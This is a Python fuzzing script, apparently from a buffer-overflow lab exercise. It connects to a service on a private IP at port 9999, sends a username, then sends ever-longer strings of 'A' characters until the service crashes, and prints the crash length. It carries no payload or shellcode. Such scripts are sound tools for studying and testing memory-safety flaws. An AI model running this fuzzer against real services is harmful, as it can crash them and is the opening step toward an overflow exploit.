#!/usr/bin/env python3

import socket, time, sys

ip = "172.20.192.1"
port = 9999
timeout = 5

username = "user"
message = "A" * 100  # Start with 100, increase each iteration

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            
            # Receive all initial server output (welcome + username prompt)
            initial = s.recv(1024)
            print(f"Server (initial): {initial.decode('latin-1', errors='replace')}")
            
            s.sendall(bytes(username + "\n", "latin-1"))  # Send username
            
            # Receive message prompt
            message_prompt = s.recv(1024)
            print(f"Server (message prompt): {message_prompt.decode('latin-1', errors='replace')}")
            
            print(f"Fuzzing with {len(message)} bytes")
            s.sendall(bytes(message + "\n", "latin-1"))  # Send message
            
            # Receive server response
            response = s.recv(1024)
            print(f"Server (response): {response.decode('latin-1', errors='replace')}")
    except Exception as e:
        print(f"Fuzzing crashed at {len(message)} bytes")
        print(f"Exception: {e}")
        sys.exit(0)
    message += "A" * 100
    time.sleep(1)
